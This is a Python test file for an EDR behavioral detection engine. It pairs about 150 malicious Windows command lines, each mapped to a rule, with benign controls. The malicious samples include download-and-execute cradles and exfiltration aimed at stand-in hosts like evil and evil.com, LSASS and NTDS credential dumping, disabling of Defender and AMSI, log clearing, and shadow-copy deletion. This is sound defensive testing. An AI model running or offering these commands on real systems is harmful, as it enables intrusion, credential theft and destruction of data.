#!/usr/bin/env python3
"""Behavioral IOA rule engine tests (valkyrie/behavioral_rules.py).

Every shipped rule must (1) fire on a representative malicious command shape,
(2) map to a real ATT&CK technique the kill-chain correlator understands, and
(3) NOT fire on a benign control. Broad coverage is the point — this is the
endpoint-detection breadth that separates a real EDR from a few heuristics.

  [1] Every rule fires on its own malicious example
  [2] Every rule's technique maps to an ATT&CK tactic (chain-ready)
  [3] Benign controls do not fire (false-positive boundary)
  [4] classify_behavior surfaces the highest-severity hit + all labels
  [5] Pipeline: a rule hit becomes a detection with the right technique
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_FAILURES: list[str] = []


def _check(label: str, ok: bool) -> None:
    print(f"  [{'+' if ok else '!'}] {label}: {'PASS' if ok else 'FAIL'}")
    if not ok:
        _FAILURES.append(label)


# (rule_id, image, parent, cmdline, path) — a representative TRUE positive each.
MALICIOUS = [
    ("office-spawns-shell", "powershell.exe", "winword.exe", "powershell -nop", ""),
    ("wmic-process-call", "wmic.exe", "cmd.exe", "wmic process call create calc.exe", ""),
    ("wmi-cim-process-create", "powershell.exe", "explorer.exe",
     'Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}', ""),
    ("wmi-spawned-process", "calc.exe", "wmiprvse.exe", "", ""),
    ("mshta-remote", "mshta.exe", "explorer.exe", "mshta https://evil/x.hta", ""),
    ("regsvr32-scriptlet", "regsvr32.exe", "cmd.exe", "regsvr32 /s /n /u /i:https://evil/x.sct scrobj.dll", ""),
    ("rundll32-proxy", "rundll32.exe", "cmd.exe", "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication\"", ""),
    ("suspicious-path-exec", "x.exe", "explorer.exe", "x.exe", r"C:\Users\v\AppData\Local\Temp\x.exe"),
    ("certutil-download", "certutil.exe", "cmd.exe", "certutil -urlcache -f http://evil/a.exe a.exe", ""),
    ("certutil-decode", "certutil.exe", "cmd.exe", "certutil -decode a.b64 a.exe", ""),
    ("bitsadmin-transfer", "bitsadmin.exe", "cmd.exe", "bitsadmin /transfer j http://evil/a.exe c:\\a.exe", ""),
    ("netsh-firewall-off", "netsh.exe", "cmd.exe", "netsh advfirewall set allprofiles state off", ""),
    ("defender-disable", "powershell.exe", "cmd.exe", "Set-MpPreference -DisableRealtimeMonitoring $true", ""),
    ("amsi-bypass", "powershell.exe", "cmd.exe", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", ""),
    ("clear-eventlog", "wevtutil.exe", "cmd.exe", "wevtutil cl Security", ""),
    ("usn-journal-delete", "fsutil.exe", "cmd.exe", "fsutil usn deletejournal /d c:", ""),
    ("execpolicy-bypass", "powershell.exe", "cmd.exe", "powershell -ExecutionPolicy Bypass -File x.ps1", ""),
    ("powershell-encoded-command", "powershell.exe", "cmd.exe",
     "powershell.exe -nop -w hidden -enc SQBFAFgAKAAnAGgAdAB0AHAA", ""),
    ("comsvcs-minidump", "rundll32.exe", "cmd.exe", "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 640 c:\\lsass.dmp full", ""),
    ("procdump-lsass", "procdump.exe", "cmd.exe", "procdump -ma lsass.exe lsass.dmp", ""),
    ("reg-save-hive", "reg.exe", "cmd.exe", "reg save hklm\\sam c:\\sam.hive", ""),
    ("ntdsutil-ifm", "ntdsutil.exe", "cmd.exe", "ntdsutil ac i ntds ifm create full c:\\out q q", ""),
    ("vaultcmd-creds", "vaultcmd.exe", "cmd.exe", "vaultcmd /listcreds:\"Windows Credentials\"", ""),
    ("reg-add-runkey", "reg.exe", "cmd.exe", "reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v x /d evil.exe", ""),
    ("schtasks-create", "schtasks.exe", "cmd.exe", "schtasks /create /tn x /tr evil.exe /sc onlogon", ""),
    ("sc-create-service", "sc.exe", "cmd.exe", "sc create evil binpath= c:\\evil.exe", ""),
    ("net-user-add", "net.exe", "cmd.exe", "net user backdoor P@ss /add", ""),
    ("net-localgroup-admin-add", "net.exe", "cmd.exe",
     "net localgroup administrators evilcorp /add", ""),
    ("wmi-event-consumer", "powershell.exe", "cmd.exe", "Set-WmiInstance -Class CommandLineEventConsumer", ""),
    ("vssadmin-delete", "vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all /quiet", ""),
    ("wbadmin-delete", "wbadmin.exe", "cmd.exe", "wbadmin delete catalog -quiet", ""),
    ("bcdedit-recovery-off", "bcdedit.exe", "cmd.exe", "bcdedit /set {default} recoveryenabled no", ""),
    ("nltest-domain", "nltest.exe", "cmd.exe", "nltest /dclist:corp", ""),
    ("whoami-priv", "whoami.exe", "cmd.exe", "whoami /priv", ""),
    ("psexec-remote", "psexec.exe", "cmd.exe", "psexec \\\\host -s cmd.exe", ""),
    ("wmic-remote-node", "wmic.exe", "cmd.exe", "wmic /node:10.0.0.5 process call create calc", ""),
    ("service-stop-security", "sc.exe", "cmd.exe", "sc stop WinDefend", ""),
    ("service-disable-security", "powershell.exe", "cmd.exe",
     "Set-Service -Name WinDefend -StartupType Disabled", ""),
    ("lateral-tool-transfer", "cmd.exe", "explorer.exe",
     "copy payload.exe \\\\10.0.0.5\\C$\\Windows\\Temp\\payload.exe", ""),
    ("rundll32-lowtrust-dll", "rundll32.exe", "cmd.exe",
     r"rundll32.exe C:\Users\Public\evil.dll,EntryPoint", ""),
    ("psexec-service-host", "psexesvc.exe", "services.exe",
     r"C:\Windows\PSEXESVC.exe", ""),
    # Extended LOLBin / trusted-utility coverage (hard-adversarial corpus,
    # 2026-08-12). Each shape was a live MISS before its rule was added.
    ("mavinject-inject", "mavinject.exe", "cmd.exe",
     "mavinject.exe 1234 /INJECTRUNNING C:\\Users\\Public\\evil.dll", ""),
    ("installutil-exec", "installutil.exe", "cmd.exe",
     "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\evil.dll", ""),
    ("regasm-regsvcs-exec", "regasm.exe", "cmd.exe", "regasm.exe /U C:\\Users\\Public\\evil.dll", ""),
    ("odbcconf-regsvr", "odbcconf.exe", "cmd.exe", "odbcconf.exe /a {REGSVR C:\\Users\\Public\\evil.dll}", ""),
    ("cmstp-exec", "cmstp.exe", "cmd.exe", "cmstp.exe /s /ns C:\\Users\\Public\\evil.inf", ""),
    ("msiexec-remote", "msiexec.exe", "cmd.exe", "msiexec.exe /q /i http://evil.example/a.msi", ""),
    ("wuauclt-proxy", "wuauclt.exe", "cmd.exe",
     "wuauclt.exe /UpdateDeploymentProvider C:\\Users\\Public\\evil.dll /RunHandlerComServer", ""),
    ("pcalua-proxy", "pcalua.exe", "cmd.exe", "pcalua.exe -a C:\\Users\\Public\\evil.exe", ""),
    ("forfiles-proxy", "forfiles.exe", "cmd.exe",
     "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", ""),
    ("hh-remote", "hh.exe", "cmd.exe", "hh.exe http://evil.example/a.chm", ""),
    ("msbuild-untrusted", "msbuild.exe", "cmd.exe", "msbuild.exe C:\\Users\\Public\\build.xml", ""),
    ("scriptlet-remote-anyimage", "cmd.exe", "explorer.exe",
     "cmd /c regsvr32 /s /i:http://evil/a.sct scrobj.dll", ""),
    ("esentutl-cred-copy", "esentutl.exe", "cmd.exe",
     "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\Users\\Public\\ntds.dit", ""),
    ("diskshadow-script", "diskshadow.exe", "cmd.exe", "diskshadow.exe /s C:\\Users\\Public\\delete.dsh", ""),
    ("wmic-xsl", "wmic.exe", "cmd.exe", "wmic.exe process list /format:\"http://evil.example/a.xsl\"", ""),
    ("ps-new-service", "powershell.exe", "cmd.exe",
     "powershell.exe New-Service -Name evil -BinaryPathName C:\\Users\\Public\\evil.exe", ""),
    ("ps-register-schtask", "powershell.exe", "cmd.exe",
     "powershell.exe Register-ScheduledTask -TaskName evil -Action (New-ScheduledTaskAction -Execute calc.exe)", ""),
    ("ps-download-cradle-exec", "powershell.exe", "cmd.exe",
     "powershell.exe Invoke-WebRequest http://evil.example/a.exe -OutFile a.exe", ""),
    ("uac-bypass-elevator-child", "cmd.exe", "fodhelper.exe", "cmd.exe /c powershell -enc AAAA", ""),
    # Round 2 (2026-08-12): AV/log tampering, more LOLBins, registry-ASEP persistence.
    ("defender-exclusion", "powershell.exe", "cmd.exe",
     "powershell.exe Add-MpPreference -ExclusionExtension .exe", ""),
    ("defender-disable-reg", "reg.exe", "cmd.exe",
     "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f", ""),
    ("wevtutil-disable-log", "wevtutil.exe", "cmd.exe", "wevtutil.exe sl Security /e:false", ""),
    ("logman-etw-stop", "logman.exe", "cmd.exe", "logman.exe stop EventLog-Application -ets", ""),
    ("msdt-follina", "msdt.exe", "winword.exe",
     "msdt.exe /id PCWDiagnostic /skip force /param IT_LaunchMethod=ContextMenu", ""),
    ("desktopimgdownldr-download", "desktopimgdownldr.exe", "cmd.exe",
     "desktopimgdownldr.exe /lockscreenurl:http://evil/a.exe /eventName:x", ""),
    ("certreq-download", "certreq.exe", "cmd.exe", "certreq.exe -Post -config http://evil/a C:\\Windows\\win.ini", ""),
    ("finger-download", "finger.exe", "cmd.exe", "finger.exe user@evil.example | cmd", ""),
    ("createdump-lsass", "createdump.exe", "cmd.exe", "createdump.exe -f lsass.dmp -u 640 lsass", ""),
    ("ifeo-debugger", "reg.exe", "cmd.exe",
     "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /d cmd.exe /f", ""),
    ("appinit-dlls", "reg.exe", "cmd.exe",
     "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /d evil.dll /f", ""),
    ("netsh-helper-dll", "netsh.exe", "cmd.exe", "netsh.exe add helper C:\\Users\\Public\\evil.dll", ""),
    ("timestomp-ps", "powershell.exe", "cmd.exe",
     "powershell.exe (Get-Item evil.exe).LastWriteTime = '2010-01-01'", ""),
    ("at-schedule", "at.exe", "cmd.exe", "at.exe 09:00 /interactive cmd /c evil.exe", ""),
    # Round 3 (2026-08-12): advanced cred access, fileless exec, misc tradecraft.
    ("mimikatz-signatures", "mimikatz.exe", "cmd.exe", 'mimikatz.exe "lsadump::dcsync /domain:corp /user:krbtgt"', ""),
    ("wdigest-enable", "reg.exe", "cmd.exe",
     "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f", ""),
    ("keymgr-creds", "rundll32.exe", "cmd.exe", "rundll32.exe keymgr.dll,KRShowKeyMgr", ""),
    ("reflective-assembly-load", "powershell.exe", "cmd.exe",
     "powershell.exe [Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQ'))", ""),
    ("decode-and-iex", "powershell.exe", "cmd.exe",
     "powershell.exe $s=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e)); IEX $s", ""),
    ("addtype-compile", "powershell.exe", "cmd.exe", "powershell.exe Add-Type -TypeDefinition $code; [X]::Run()", ""),
    ("cipher-wipe", "cipher.exe", "cmd.exe", "cipher.exe /w:C:\\Users\\bob", ""),
    ("kill-security-process", "cmd.exe", "cmd.exe", "cmd.exe /c taskkill /IM MsMpEng.exe /F", ""),
    ("exfil-http-upload", "powershell.exe", "cmd.exe",
     "powershell.exe Invoke-RestMethod -Uri http://evil/up -Method Post -InFile C:\\data.zip", ""),
    ("winrm-lateral", "powershell.exe", "cmd.exe", "powershell.exe Enter-PSSession -ComputerName dc01 -Credential $c", ""),
    ("runas-savecred", "runas.exe", "cmd.exe", "runas.exe /user:corp\\admin /savecred cmd.exe", ""),
    # Round 4 (2026-08-12): Kerberos, PtH, dumpers, LOLBins, COM hijack, pivot, BITS.
    ("kerberoast-tooling", "rubeus.exe", "cmd.exe", "rubeus.exe kerberoast /outfile:hashes.txt", ""),
    ("setspn-query-all", "setspn.exe", "cmd.exe", "setspn.exe -T corp -Q */*", ""),
    ("pass-the-hash-tooling", "mimikatz.exe", "cmd.exe", 'mimikatz.exe "sekurlsa::pth /user:admin /ntlm:hash /run:cmd"', ""),
    ("lsass-dumper-tool", "nanodump.exe", "cmd.exe", "nanodump.exe --write out.dmp", ""),
    ("lsass-dump-artifact", "svchost.exe", "cmd.exe", "svchost.exe -o lsass.dmp", ""),
    ("wsl-indirect-exec", "wsl.exe", "cmd.exe", "wsl.exe -e /bin/bash -c 'curl http://evil/a|bash'", ""),
    ("extrac32-copy", "extrac32.exe", "cmd.exe", "extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\Public\\calc.exe", ""),
    ("ttdinject-launch", "ttdinject.exe", "cmd.exe", "ttdinject.exe /ClientParams x /Launch C:\\Users\\Public\\evil.exe", ""),
    ("presentationhost-exec", "presentationhost.exe", "cmd.exe", "presentationhost.exe C:\\Users\\Public\\evil.xbap", ""),
    ("syncappvpublishing-exec", "syncappvpublishingserver.exe", "cmd.exe", 'syncappvpublishingserver.exe "n;(New-Object Net.WebClient).DownloadString(\'http://evil\')|IEX"', ""),
    ("com-hijack", "reg.exe", "cmd.exe", "reg add HKCU\\Software\\Classes\\CLSID\\{guid}\\InprocServer32 /ve /d C:\\Users\\Public\\evil.dll /f", ""),
    ("netsh-portproxy", "netsh.exe", "cmd.exe", "netsh.exe interface portproxy add v4tov4 listenport=8080 connectport=445 connectaddress=10.0.0.5", ""),
    ("bits-persistence", "bitsadmin.exe", "cmd.exe", "bitsadmin.exe /SetNotifyCmdLine job C:\\Users\\Public\\evil.exe NULL", ""),
    # Round-6 breadth — sensor self-defense, inhibit-recovery, staging,
    # persistence, credential access, C2 tunnelling, ingress, LOLBins.
    ("service-delete-security", "sc.exe", "cmd.exe", "sc delete SysmonDrv", ""),
    ("fltmc-unload", "fltmc.exe", "cmd.exe", "fltmc unload SysmonDrv", ""),
    ("sysmon-uninstall", "sysmon64.exe", "cmd.exe", "sysmon64.exe -u force", ""),
    ("shadowcopy-delete-wmi", "wmic.exe", "cmd.exe", "wmic shadowcopy delete /nointeractive", ""),
    ("lsa-package-persistence", "reg.exe", "cmd.exe", "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Security Packages\" /d mimilib /f", ""),
    ("screensaver-hijack", "reg.exe", "cmd.exe", "reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /d C:\\evil.scr /f", ""),
    ("startup-folder-drop", "cmd.exe", "explorer.exe", "cmd /c copy evil.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"", ""),
    ("browser-cred-theft", "cmd.exe", "cmd.exe", "cmd /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" C:\\Users\\Public\\ld.db", ""),
    ("cred-hunt-files", "findstr.exe", "cmd.exe", "findstr /si password *.txt *.ini *.config", ""),
    ("cmdkey-list", "cmdkey.exe", "cmd.exe", "cmdkey /list", ""),
    ("wifi-password-export", "netsh.exe", "cmd.exe", "netsh wlan export profile key=clear folder=C:\\Users\\Public", ""),
    ("archive-password-staging", "7z.exe", "cmd.exe", "7z.exe a -pInfected loot.7z C:\\Users\\bob\\AppData", ""),
    ("reverse-ssh-tunnel", "ssh.exe", "cmd.exe", "ssh -R 3389:localhost:3389 attacker@evil.com", ""),
    ("etw-patch-reflection", "powershell.exe", "cmd.exe", "[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')", ""),
    ("remote-download-iex", "powershell.exe", "cmd.exe", "powershell irm http://evil/a.ps1 | iex", ""),
    ("curl-wget-download-exe", "curl.exe", "cmd.exe", "curl.exe -o C:\\Users\\Public\\a.exe http://evil.com/a.exe", ""),
    ("msxsl-transform", "msxsl.exe", "cmd.exe", "msxsl.exe evil.xml evil.xsl", ""),
    ("register-cimprovider-dll", "register-cimprovider.exe", "cmd.exe", "register-cimprovider.exe -path C:\\Users\\Public\\evil.dll", ""),
    ("scriptrunner-proxy", "scriptrunner.exe", "cmd.exe", "scriptrunner.exe -appvscript evil.bat", ""),
    ("infdefaultinstall-inf", "infdefaultinstall.exe", "cmd.exe", "InfDefaultInstall.exe C:\\Users\\Public\\evil.inf", ""),
    ("xwizard-runwizard", "xwizard.exe", "cmd.exe", "xwizard.exe RunWizard {clsid-guid}", ""),
    ("dnscmd-plugin-dll", "dnscmd.exe", "cmd.exe", "dnscmd.exe /config /serverlevelplugindll \\\\evil\\p.dll", ""),
    # Round-7 breadth — env-var injection, boot tamper, log/audit evasion,
    # account manipulation, service-reg persistence, lateral exec, capture.
    ("cor-profiler-hijack", "reg.exe", "cmd.exe", "reg add \"HKCU\\Environment\" /v COR_PROFILER /d {clsid} /f", ""),
    ("bcdedit-boot-tamper", "bcdedit.exe", "cmd.exe", "bcdedit /set testsigning on", ""),
    ("powershell-v2-downgrade", "powershell.exe", "cmd.exe", "powershell -version 2 -nop -c IEX(x)", ""),
    ("auditpol-disable", "auditpol.exe", "cmd.exe", "auditpol /set /category:* /success:disable /failure:disable", ""),
    ("ps-eventlog-tamper", "powershell.exe", "cmd.exe", "Clear-EventLog -LogName Security", ""),
    ("account-enable", "net.exe", "cmd.exe", "net user Administrator /active:yes", ""),
    ("service-imagepath-reg", "reg.exe", "cmd.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\evil /v ImagePath /d C:\\evil.exe /f", ""),
    ("winrs-lateral", "winrs.exe", "cmd.exe", "winrs -r:dc01 cmd /c whoami", ""),
    ("netsh-trace-capture", "netsh.exe", "cmd.exe", "netsh trace start capture=yes tracefile=C:\\out.etl", ""),
    ("pktmon-capture", "pktmon.exe", "cmd.exe", "pktmon start --etw -f C:\\cap.etl", ""),
    # Round-9 breadth — UAC-bypass registry hijack, Defender-as-LOLBin, hiding.
    ("uac-bypass-hijack", "reg.exe", "cmd.exe", "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd /c payload.exe\" /f", ""),
    ("mpcmdrun-download", "mpcmdrun.exe", "cmd.exe", "MpCmdRun.exe -DownloadFile -url http://evil/a.exe -path C:\\Users\\Public\\a.exe", ""),
    ("defender-signature-removal", "mpcmdrun.exe", "cmd.exe", "MpCmdRun.exe -RemoveDefinitions -All", ""),
    ("file-hide-attrib", "attrib.exe", "cmd.exe", "attrib +h +s C:\\Users\\Public\\evil.exe", ""),
    ("firewall-allow-payload", "netsh.exe", "cmd.exe", "netsh advfirewall firewall add rule name=backdoor dir=in action=allow program=\"C:\\Users\\Public\\evil.exe\"", ""),
    ("mofcomp-wmi-persistence", "mofcomp.exe", "cmd.exe", "mofcomp.exe C:\\Users\\Public\\evil.mof", ""),
    # Round-11 breadth — registry telemetry-disable, ASEP-DLL, DCOM, history, wipe.
    ("registry-telemetry-disable", "reg.exe", "cmd.exe", "reg add HKLM\\Software\\Microsoft\\Windows Script\\Settings /v AmsiEnable /t REG_DWORD /d 0 /f", ""),
    ("registry-asep-dll", "reg.exe", "cmd.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\evil /v Driver /d evil.dll /f", ""),
    ("dcom-lateral", "powershell.exe", "cmd.exe", "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','10.0.0.5'))", ""),
    ("ps-history-creds", "powershell.exe", "cmd.exe", "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", ""),
    ("format-volume", "format.com", "cmd.exe", "format D: /fs:ntfs /q /y", ""),
    ("mass-file-delete", "cmd.exe", "cmd.exe", "del /f /s /q C:\\Users\\bob\\Documents\\*.*", ""),
    # Round-14 breadth — offensive tooling, SYSTEM shell, hidden staging, recovery.
    ("offensive-cred-tooling", "powershell.exe", "cmd.exe", "Import-Module .\\SharpDPAPI; Invoke-SharpDPAPI -command masterkeys", ""),
    ("psexec-system", "psexec.exe", "cmd.exe", "psexec -s -i cmd.exe", ""),
    ("hidden-window-staging-exec", "powershell.exe", "cmd.exe", "Start-Process C:\\Users\\Public\\a.exe -WindowStyle Hidden", ""),
    ("recovery-disable-reg", "reg.exe", "cmd.exe", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl /v BootStatusPolicy /d 3 /f", ""),
    # Threat-informed additions (2026-08-15): Red Canary 2025 top-10 gap
    # analysis (masquerade, ClickFix) + Volt Typhoon CISA AA24-038A real-command
    # probe (ldifde export, raw ntds.dit copy).
    ("masquerade-system-binary-location", "svchost.exe", "services.exe",
     "svchost.exe -k netsvcs", r"C:\Users\v\AppData\Local\Temp\svchost.exe"),
    ("clickfix-run-dialog-exec", "powershell.exe", "explorer.exe",
     "powershell -w hidden -enc SQBFAFgA", ""),
    ("ldifde-csvde-ad-export", "ldifde.exe", "cmd.exe",
     "ldifde -f c:\\out.txt -p subtree", ""),
    ("ntds-dit-file-access", "cmd.exe", "cmd.exe",
     "copy c:\\windows\\ntds\\ntds.dit c:\\temp\\n.dit", ""),
    # Ransomware-affiliate advisory probe (LockBit/Black Basta/ALPHV): shadow
    # resize, free-space wipe, rclone cloud exfil.
    ("vssadmin-resize-shadowstorage", "vssadmin.exe", "cmd.exe",
     "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401mb", ""),
    ("cipher-freespace-wipe", "cipher.exe", "cmd.exe", "cipher /w:c:\\", ""),
    ("rclone-cloud-exfil", "rclone.exe", "cmd.exe",
     "rclone copy c:\\data mega:backup --transfers 20", ""),
]

# Benign command shapes that must NEVER fire any rule.
BENIGN = [
    ("chrome.exe", "explorer.exe", "chrome.exe --profile-directory=Default", r"C:\Program Files\Google\Chrome\chrome.exe"),
    ("powershell.exe", "explorer.exe", "powershell Get-ChildItem C:\\Users", ""),
    ("cmd.exe", "explorer.exe", "cmd /c dir", ""),
    ("reg.exe", "cmd.exe", "reg query hklm\\software\\microsoft\\windows", ""),   # query, not add/save
    ("net.exe", "cmd.exe", "net view", ""),                                       # not user/add
    # Regression control for the redteam-evaluation finding (2026-07-30):
    # net-user-add used to match on the bare substring "net user" with no
    # mutating verb required, so listing accounts fired the identical
    # T1136.001 "account created" incident as actually creating one.
    ("net.exe", "cmd.exe", "net user", ""),                                       # list accounts, not /add
    ("net.exe", "cmd.exe", "net user backdoor", ""),                              # query one account, not /add
    ("net.exe", "cmd.exe", "net localgroup administrators", ""),                  # list membership, not /add
    ("certutil.exe", "cmd.exe", "certutil -hashfile a.exe sha256", ""),           # hash, not download/decode
    ("sc.exe", "cmd.exe", "sc query windefend", ""),                              # query, not create
    ("schtasks.exe", "cmd.exe", "schtasks /query", ""),                           # query, not create
    ("wmic.exe", "cmd.exe", "wmic os get caption", ""),                           # info, not process-call/node
    ("winword.exe", "explorer.exe", "winword.exe report.docx", r"C:\Program Files\Microsoft Office\winword.exe"),
    ("msbuild.exe", "devenv.exe", "msbuild project.sln", r"C:\Program Files\dotnet\msbuild.exe"),
    # Regression controls for the redteam-evaluation T1489/T1570 findings:
    ("sc.exe", "cmd.exe", "sc stop Spooler", ""),                       # stop verb, unrelated service
    ("sc.exe", "cmd.exe", "sc query WinDefend", ""),                    # security service, but a query not stop/disable
    ("net.exe", "cmd.exe", "net stop Spooler", ""),                     # stop verb, unrelated service
    ("powershell.exe", "cmd.exe", "Get-Service -Name WinDefend", ""),   # security service, read-only
    ("robocopy.exe", "explorer.exe", "robocopy C:\\Data D:\\Backup /MIR", ""),   # local paths, no UNC
    ("cmd.exe", "explorer.exe", "copy \\\\fileserver\\shared\\report.docx .", ""),  # UNC to a NON-admin share
    # rundll32 doing ordinary Windows work — DLLs from System32, which is where
    # every legitimate rundll32 invocation loads from. These are extremely
    # common (Control Panel applets, printer UI, network dialogs) and are the
    # FP boundary for rundll32-lowtrust-dll.
    ("rundll32.exe", "explorer.exe",
     r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL", ""),
    ("rundll32.exe", "explorer.exe",
     r"rundll32.exe C:\Windows\System32\printui.dll,PrintUIEntry /o", ""),
    # An installer legitimately writing to ProgramData, but NOT via rundll32 —
    # pins that the low-trust path list alone cannot fire without rundll32.
    ("setup.exe", "explorer.exe", r"setup.exe /S", r"C:\ProgramData\App\setup.exe"),
    # FP boundaries for the extended LOLBin rules (2026-08-12):
    ("msiexec.exe", "explorer.exe", "msiexec.exe /i C:\\Users\\bob\\Downloads\\Zoom.msi", ""),   # LOCAL package, not remote
    ("msbuild.exe", "devenv.exe", "msbuild.exe C:\\src\\MyApp\\MyApp.csproj /p:Configuration=Release", ""),  # normal build, not temp/public
    ("powershell.exe", "cmd.exe", "Invoke-WebRequest https://api.github.com/repos -OutFile out.json", ""),   # data download, not an executable
    ("esentutl.exe", "cmd.exe", "esentutl.exe /mh C:\\ProgramData\\App\\app.edb", ""),           # db header check, not NTDS/SAM/VSS
    ("forfiles.exe", "cmd.exe", "forfiles /p C:\\logs /m *.log /d -30", ""),                       # enumerate only, no /c command
    ("regasm.exe", "devenv.exe", "regasm.exe MyLib.dll /codebase", ""),                            # dev registration w/o /u or unpack path -> stays clear of /u
    # Round-2 FP boundaries — read-only / legitimate siblings of the tamper rules:
    ("wevtutil.exe", "cmd.exe", "wevtutil.exe qe Security /c:5 /rd:true /f:text", ""),              # query events, not sl /e:false
    ("powershell.exe", "cmd.exe", "Get-MpPreference | Select ExclusionPath", ""),                  # read AV config, not Add-MpPreference
    ("netsh.exe", "cmd.exe", "netsh.exe interface show interface", ""),                            # show, not add helper
    ("logman.exe", "cmd.exe", "logman.exe query", ""),                                             # query, not stop/delete
    ("reg.exe", "cmd.exe", "reg add HKCU\\Software\\MyApp /v Setting /d 1 /f", ""),                 # app's own key, not Defender/IFEO/AppInit
    # Round-3 FP boundaries:
    ("powershell.exe", "cmd.exe", "Invoke-RestMethod https://api.github.com/repos", ""),           # GET data, not -InFile upload
    ("cipher.exe", "cmd.exe", "cipher.exe /c C:\\Users\\bob\\doc.txt", ""),                         # show status, not /w wipe
    ("runas.exe", "cmd.exe", "runas.exe /user:corp\\admin mmc.exe", ""),                            # interactive, no /savecred
    ("powershell.exe", "cmd.exe", "Add-Type -AssemblyName System.Windows.Forms", ""),              # load framework, not -TypeDefinition
    ("cmd.exe", "cmd.exe", "taskkill /IM notepad.exe /F", ""),                                      # kill a normal app, not a security tool
    # Round-4 FP boundaries:
    ("setspn.exe", "cmd.exe", "setspn.exe -L corp\\myservice", ""),                                 # list SPNs for one account, not -Q
    ("netsh.exe", "cmd.exe", "netsh.exe interface portproxy show all", ""),                         # portproxy show, not add
    ("bitsadmin.exe", "cmd.exe", "bitsadmin.exe /list /allusers", ""),                              # list jobs, not SetNotifyCmdLine
    ("extrac32.exe", "cmd.exe", "extrac32.exe /Y drivers.cab", ""),                                 # cab extract, not /C copy
    ("wsl.exe", "explorer.exe", "wsl.exe --list --verbose", ""),                                    # list distros, not -e exec
    ("verclsid.exe", "explorer.exe", "verclsid.exe /S /C {CLSID}", ""),                             # Explorer's own COM-approval check
    # Round-6 FP boundaries — close-but-legitimate siblings of the new rules:
    ("sc.exe", "cmd.exe", "sc delete MyOldApp", ""),                                                # delete a NON-security service
    ("fltmc.exe", "cmd.exe", "fltmc filters", ""),                                                  # list filters, not unload
    ("sysmon64.exe", "cmd.exe", "sysmon64.exe -c", ""),                                             # dump config, not -u uninstall
    ("powershell.exe", "cmd.exe", "Get-CimInstance Win32_ShadowCopy", ""),                          # list shadows, not delete
    ("vssadmin.exe", "cmd.exe", "vssadmin list shadows", ""),                                       # list, not delete
    ("reg.exe", "cmd.exe", "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"", ""),      # read Lsa, not add a package
    ("reg.exe", "cmd.exe", "reg query \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE", ""),       # read screensaver, not set
    ("cmd.exe", "msiexec.exe", "cmd /c copy app.lnk \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\app.lnk\"", ""),  # installer .lnk, not an exe payload
    ("cmd.exe", "cmd.exe", "cmd /c copy \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Bookmarks\" D:\\bk", ""),  # backup bookmarks, not the cred DB
    ("findstr.exe", "cmd.exe", "findstr /s TODO *.py", ""),                                         # recursive grep, no secret keyword
    ("powershell.exe", "cmd.exe", "Get-ChildItem -Recurse -Include *.cs | Select-String function", ""),  # code search, no secret keyword
    ("netsh.exe", "cmd.exe", "netsh wlan show profiles", ""),                                       # list profiles, not export key=clear
    ("7z.exe", "cmd.exe", "7z.exe a backup.7z C:\\project", ""),                                    # unprotected archive add
    ("7z.exe", "cmd.exe", "7z.exe x installer.7z -oC:\\tools", ""),                                 # extraction, not add
    ("ssh.exe", "cmd.exe", "ssh -L 8080:localhost:8080 user@host", ""),                             # LOCAL forward, not reverse -R
    ("scp.exe", "cmd.exe", "scp -r ./dist user@host:/srv", ""),                                     # recursive copy, not an ssh -R tunnel
    ("curl.exe", "cmd.exe", "curl.exe https://api.github.com/repos/x/y -o data.json", ""),          # JSON fetch, not an executable
    ("wget.exe", "cmd.exe", "wget.exe https://example.com/page.html", ""),                          # html fetch, not an executable
    ("powershell.exe", "cmd.exe", "irm https://api.example.com/status | ConvertFrom-Json", ""),     # REST GET parsed, not piped to iex
    ("powershell.exe", "cmd.exe", "[System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\")", ""),  # load a framework asm, not ETW patch
    # Round-7 FP boundaries:
    ("reg.exe", "cmd.exe", "reg query \"HKCU\\Environment\" /v COR_PROFILER", ""),                  # read env var, not set the hook
